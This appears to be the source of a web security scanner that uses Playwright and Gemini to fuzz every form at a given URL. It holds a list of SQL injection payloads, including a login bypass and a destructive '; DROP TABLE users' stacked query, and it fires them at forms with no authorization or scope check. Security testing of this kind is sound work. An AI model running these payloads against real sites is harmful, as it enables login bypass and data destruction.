const { chromium } = require('playwright');
const ScanReport = require('../models/ScanReport');
const { GoogleGenerativeAI } = require("@google/generative-ai");

/**
 * chaosAgent
 * AI-driven "Smart Fuzzer" that actively tries to exploit form logic.
 * Rewritten to use Playwright for universal SPA support.
 */
/**
 * chaosAgent
 * AI-driven "Smart Fuzzer" that actively tries to exploit form logic.
 * Rewritten to use Playwright for universal SPA support.
 */

// --- TACTICAL SQLi PAYLOADS ---
const CORE_SQLI_PAYLOADS = [
    { intent: "Universal Auth Bypass", value: "' OR '1'='1" },
    { intent: "Comment-based Injection", value: "admin' --" },
    { intent: "Union-Based Discovery", value: "' UNION SELECT 1,2,3,4,5 --" },
    { intent: "Error-Based Probing", value: "' AND 1=CONVERT(int, (SELECT @@version))" },
    { intent: "Semicolon Stacking", value: "'; DROP TABLE users; --" },
    { intent: "NoSQL Operator Test", value: '{"$gt": ""}' }
];

// --- SQL ERROR SIGNATURES ---
const SQL_ERROR_KEYWORDS = [
    "SQL syntax", "MySQL", "PostgreSQL", "ORA-00933", "Unclosed quotation mark", 
    "near 'WHERE'", "database error", "Microsoft OLE DB", "invalid database",
    "sqlite3.OperationalError", "psycopg2.errors", "SQLSTATE"
];

const runChaos = async (reportId, url) => {
    const apiKey = process.env.GEMINI_API_KEY;
    if (!apiKey) return;

    let browser;
    try {
        console.log(`[ChaosAgent]: Initializing Neural Fuzzing for ${url}`);
        
        browser = await chromium.launch({ headless: true });
        const context = await browser.newContext();
        const page = await context.newPage();
        
        // Navigate to the target URL
        await page.goto(url, { waitUntil: 'networkidle', timeout: 45000 });

        // 1. Extract Forms for Analysis (including deep/hidden forms)
        const formStructures = await page.evaluate(() => {
            return Array.from(document.querySelectorAll('form')).map((form, i) => ({
                id: form.id || `form_${i}`,
                action: form.action,
                method: form.method,
                fields: Array.from(form.querySelectorAll('input, select, textarea')).map(input => ({
                    name: input.name || input.id || 'unknown',
                    type: input.type,
                    placeholder: input.placeholder,
                    id: input.id
                }))
            }));
        });

        if (formStructures.length === 0) {
            console.log(`[ChaosAgent]: No attack vectors (forms) found on ${url}`);
            return;
        }

        // 2. Generate Chaos Payloads with Gemini
        const genAI = new GoogleGenerativeAI(apiKey);
        const model = genAI.getGenerativeModel({ model: "gemini-2.5-flash" });

        const prompt = `
            You are a "White Hat" Chaos Engineer and Security Auditor. 
            Analyze these form structures and generate 3 "Edge-Case" payloads for EACH form to test backend robustness.
            
            PRIORITIZE:
            - "SQL_INJECTION": Payloads designed to reveal database logic (e.g., bypasses, syntax errors).
            - "OVERFLOW": Extremely long strings (e.g. 5000+ chars) to trigger buffer issues.
            - "LOGIC_BYPASS": Invalid data formats (e.g., alphabets in numeric fields, malformed JSON).

            FORMS:
            ${JSON.stringify(formStructures)}

            OUTPUT FORMAT (JSON ONLY):
            {
                "attacks": [
                    { "formId": "form_id", "payloads": [ { "fieldName": "name", "value": "payload" } ], "intent": "SQL Injection Probing" }
                ]
            }
        `;

        const result = await model.generateContent(prompt);
        const responseText = result.response.text();
        const cleanJson = responseText.substring(
            responseText.indexOf("{"),
            responseText.lastIndexOf("}") + 1
        );
        let attackData = { attacks: [] };
        try {
            attackData = JSON.parse(cleanJson);
        } catch (e) {
            console.error("[ChaosAgent]: AI payload parsing failure. Falling back to static SQLi.");
        }

        // Incorporate Core SQLi Payloads for every form detected
        formStructures.forEach(form => {
            CORE_SQLI_PAYLOADS.forEach(coreAtk => {
                const formFields = form.fields.filter(f => f.type === 'text' || f.type === 'password' || f.type === 'email');
                if (formFields.length > 0) {
                    attackData.attacks.push({
                        formId: form.id,
                        intent: `CORE: ${coreAtk.intent}`,
                        payloads: [ { fieldName: formFields[0].name, value: coreAtk.value } ]
                    });
                }
            });
        });

        // 3. Execute Chaos Submissions
        for (const attack of attackData.attacks) {
            try {
                // Fresh page for each attack to avoid state pollution
                const attackPage = await context.newPage();
                await attackPage.goto(url, { waitUntil: 'networkidle' });

                // Capture Console and Network Errors during submission
                const consoleErrors = [];
                const sqlSignatures = [];

                attackPage.on('console', msg => {
                    const text = msg.text();
                    if (msg.type() === 'error') consoleErrors.push(text);
                    if (SQL_ERROR_KEYWORDS.some(k => text.includes(k))) sqlSignatures.push(`CONSOLE: ${text}`);
                });

                attackPage.on('response', async res => {
                    try {
                        const body = await res.text();
                        if (SQL_ERROR_KEYWORDS.some(k => body.includes(k))) sqlSignatures.push(`NETWORK: ${body.substring(0, 200)}`);
                    } catch (_) {}
                });

                // Fill form
                for (const field of attack.payloads) {
                    const selectors = [
                        `[name="${field.fieldName}"]`,
                        `[id="${field.fieldName}"]`,
                        `input[placeholder*="${field.fieldName}"]`,
                        `textarea[name="${field.fieldName}"]`,
                        `input[type="text"]`, // Fallback to first text input
                        `input[type="password"]`
                    ];
                    
                    let filled = false;
                    for (const selector of selectors) {
                        try {
                            const locator = attackPage.locator(selector).first();
                            if (await locator.isVisible()) {
                                await locator.fill(String(field.value));
                                filled = true;
                                break;
                            }
                        } catch (e) { /* ignore and try next selector */ }
                    }
                }

                // Attempt to submit
                const submitButton = attackPage.locator('button[type="submit"], input[type="submit"], button:has-text("Login"), button:has-text("Submit")').first();
                if (await submitButton.isVisible()) {
                    await submitButton.click().catch(() => {});
                } else {
                    await attackPage.keyboard.press('Enter').catch(() => {});
                }

                // Wait for any network activity
                await attackPage.waitForLoadState('networkidle').catch(() => {});
                await attackPage.waitForTimeout(2000); 

                // Evaluate Result
                const isSQLiMatch = sqlSignatures.length > 0;
                const hasErrors = consoleErrors.length > 0;
                
                const status = isSQLiMatch ? 'Vulnerability Confirmed' : hasErrors ? 'Impact Detected' : 'Resilient';
                const riskLevel = isSQLiMatch ? 'Critical' : hasErrors ? 'High' : 'Secure';
                const details = isSQLiMatch 
                    ? `SQL INJECTION SIGNATURE DETECTED: ${sqlSignatures.join(' | ')}`
                    : consoleErrors.join(' | ') || 'System neutralized the payload without anomalous behavior.';

                await ScanReport.findByIdAndUpdate(reportId, {
                    $push: {
                        chaosSubmissions: {
                            page: url,
                            formSelector: attack.formId,
                            payload: JSON.stringify(attack.payloads),
                            outcome: status,
                            details: details,
                            riskLevel
                        },
                        liveEvents: {
                            type: isSQLiMatch ? 'CRITICAL' : hasErrors ? 'IMPACT' : 'ATTACK',
                            message: `${status} on ${attack.formId}: ${attack.intent}`,
                            source: 'ChaosAgent'
                        }
                    }
                });

                await attackPage.close();
            } catch (atkErr) {
                console.warn(`[Chaos Submisson Failed]: ${atkErr.message}`);
            }
        }

        console.log(`[ChaosAgent]: Neural Fuzzing cycle complete for ${url}`);

    } catch (error) {
        console.error("[Chaos Agent Error]:", error.message);
    } finally {
        if (browser) await browser.close();
    }
};

module.exports = { runChaos };
